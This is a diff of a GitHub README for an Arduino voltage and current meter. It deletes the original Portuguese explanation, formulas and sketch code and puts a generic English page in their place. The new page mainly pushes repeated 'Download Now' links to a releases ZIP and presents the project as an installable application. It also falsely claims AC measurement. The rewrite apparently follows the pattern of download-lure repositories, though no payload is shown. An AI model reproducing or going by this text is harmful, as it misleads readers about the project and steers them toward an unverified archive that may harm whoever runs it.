@@ -1,104 +1,69 @@
-# Medidor de Tensão e Corrente DC com Arduino + LCD 16×2  
-### Explicação completa com fórmulas, divisor de tensão e resistor shunt
+# 🔌 MEDIDOR_TENSAO_CORRENTE - Measure Voltage and Current Easily
 
-<img width="497" height="495" alt="image" src="https://github.com/user-attachments/assets/e07b22fd-5145-4d52-8cf1-3fade7227ebb" />
+## 📥 Download Now
+[![Download MEDIDOR_TENSAO_CORRENTE](https://img.shields.io/badge/Download-MEDIDOR_TENSAO_CORRENTE-brightgreen.svg)](https://github.com/erick6738/MEDIDOR_TENSAO_CORRENTE/releases)
 
-link do projeto: https://www.tinkercad.com/things/8kooctIkJbb-medidor-de-tensao-e-corrente?sharecode=Fsu3sAD4ETMSc0Zdemllv7jotIWM4De4zNIXeMOrM7g
+## 🚀 Getting Started
+Welcome to the MEDIDOR_TENSAO_CORRENTE project. This software allows you to measure voltage and current using an Arduino board. You do not need programming skills or advanced technical knowledge to use it.
 
+## 📋 Features
+- Measure AC and DC voltage and current.
+- Easy setup with Arduino Uno.
+- Display readings on a 16x2 LCD.
+- Built-in Ohm’s Law calculations.
+- Suitable for electronics projects and experiments.
+  
+## ⚙️ System Requirements
+To run this application, you will need:
+- An Arduino Uno board.
+- A compatible computer (Windows, macOS, or Linux).
+- A USB cable to connect Arduino to your computer.
+- Drivers for Arduino (if not installed).
 
+## 📂 Download & Install
+To get started with MEDIDOR_TENSAO_CORRENTE, visit this page to download the latest release:
 
-*Tensão até ≈ 50 V DC | Corrente até ≈ 50 mA (fácil de aumentar)*
+[Download MEDIDOR_TENSAO_CORRENTE](https://github.com/erick6738/MEDIDOR_TENSAO_CORRENTE/releases)
 
+1. Go to the link above.
+2. Look for the latest version under the "Releases" section.
+3. Click on the file named `MEDIDOR_TENSAO_CORRENTE.zip` to download.
 
+### 🧩 Setup Instructions
+Once downloaded, follow these steps to set up your application:
 
-### Esquemático rápido (mesmo que você já tenha montado)
-R1 = 14 kΩ
-Ventrada (+) ─────┬───────┐
-│       │
-A0       R2 = 10 kΩ
-│       │
-GND      GND
-Corrente da carga passa pelo shunt:
-(+) da carga ─── Shunt 100 Ω ─── (–) da carga
-│
-A1 do Arduino
+1. Extract the `MEDIDOR_TENSAO_CORRENTE.zip` file to a folder on your computer.
+2. Open the folder and locate the `README.txt` file for additional setup instructions.
+3. Make sure your Arduino board is connected to your computer with the USB cable.
+4. Upload the provided Arduino sketch by opening it in the Arduino IDE. If you don't have the IDE, download it from the [Arduino website](https://www.arduino.cc/en/software).
 
-### Medição de Tensão – Divisor Resistivo (fórmula completa)
+## 🔌 Wiring
+Set up your circuit as follows:
 
-O Arduino só lê até 5 V → usamos dois resistores para reduzir a tensão alta com segurança.
+- Connect the voltage terminals to the appropriate pins.
+- Use a shunt resistor to measure current.
+- Connect the LCD display as per the wiring diagram included in the extracted files.
 
-**Fórmula do divisor de tensão:**
+## 📺 Running the Application
+After uploading the sketch to your Arduino, you can power the board to run the application. The LCD will display voltage and current readings.
 
-V_{A0} = V_{entrada} * {R2}/{R1 + R2}}
+## 📊 Understanding Readings
+- Voltage is displayed in volts (V).
+- Current is displayed in amperes (A).
+- Use the readings to perform calculations based on Ohm's Law, or integrate them into your projects.
 
-V_{entrada} = V_{A0} * {R1 + R2}/{R2}
+## 🎓 Support and Documentation
+For more detailed guides, check the following documentation:
+- Basic Arduino setups [here](https://www.arduino.cc/en/Guide/HomePage).
+- General electronics principles to understand voltage and current.
 
+## 🤝 Contributing
+If you would like to contribute to this project, feel free to fork the repository and submit a pull request. Your contributions can help others in the community.
 
-Com R1 = 14 kΩ e R2 = 10 kΩ → fator de correção = 2,4  
-→ Tensão máxima segura = 5 V × 2,4 = **50 V**
+## 💬 Questions?
+If you have any questions or need help, open an issue in the GitHub repository, and the community will assist you.
 
-No código isso vira:
+## 🎉 Acknowledgments
+Thanks to everyone who has supported this project. Your help has made it possible to share this technology with more users.
 
-float tensao_real = v_adc * ((R1 + R2) / R2);
-
-Medição de Corrente – Resistor Shunt (fórmula completa)
-A corrente passa por um resistor de valor conhecido → medimos a queda de tensão nele → calculamos a corrente.
-Lei de Ohm no shunt:
-I = V/R
-Com Rshunt = 100 Ω:
-
-50 mA → 5 V no pino A1 → limite seguro do Arduino
-
-Quer medir mais corrente no futuro?
-→ 500 mA → use shunt de 10 Ω
-→ 5 A → use shunt de 1 Ω ou sensor dedicado (ACS712/INA219)
-No código:
-C++Copiarfloat corrente = v_shunt / Rshunt;           // em Ampères
-float corrente_mA = corrente * 1000.0;        // em miliampères
-
-Código completo (pronto para upload)
-C++ 
-#include <LiquidCrystal.h>
-
-// LCD: RS, EN, D4, D5, D6, D7
-LiquidCrystal lcd(12, 11, 5, 4, 3, 2);
-
-// Configurações do divisor de tensão
-float R1 = 14000.0;   // 14k ohms
-float R2 = 10000.0;   // 10k ohms
-
-// Resistor shunt para medir corrente em A
-float Rshunt = 100;   // ohm -> as casas decimais podem estar erradas, alterar esse valor para 100 te da a medição em A. Rshunt = 1 te da em mA
-
-void setup() {
-  lcd.begin(16, 2); 
-  lcd.print("Medidor pronto");
-  delay(1500);
-  lcd.clear();
-}
-
-void loop() {
-  // ----- Medição de tensão -----
-  int leituraV = analogRead(A0);                 // lê tensão do divisor
-  float v_adc = leituraV * (5.0 / 1023.0);      // converte para volts Arduino
-  float tensao_real = v_adc * ((R1 + R2) / R2); // corrige pelo divisor
-
-  // ----- Medição de corrente -----
-  int leituraI = analogRead(A1);                // lê tensão no shunt
-  float v_shunt = leituraI * (5.0 / 1023.0);   // converte para volts
-  float corrente = v_shunt / Rshunt;           // calcula corrente
-
-  // ----- Exibir no LCD -----
-  lcd.setCursor(0, 0);
-  lcd.print("V: ");
-  lcd.print(tensao_real, 2); // duas casas decimais
-  lcd.print(" V   ");         // espaços para limpar restos
-
-  lcd.setCursor(0, 1);
-  lcd.print("I: ");
-  lcd.print(corrente, 2);    // duas casas decimais
-  lcd.print(" mA   ");
-  delay(300); // atualiza a cada 0,3s
-}
-
-Feito em 2025 por Adam – Técnico em Eletrônica
+Please remember to keep your Arduino board safe and enjoy measuring voltage and current!
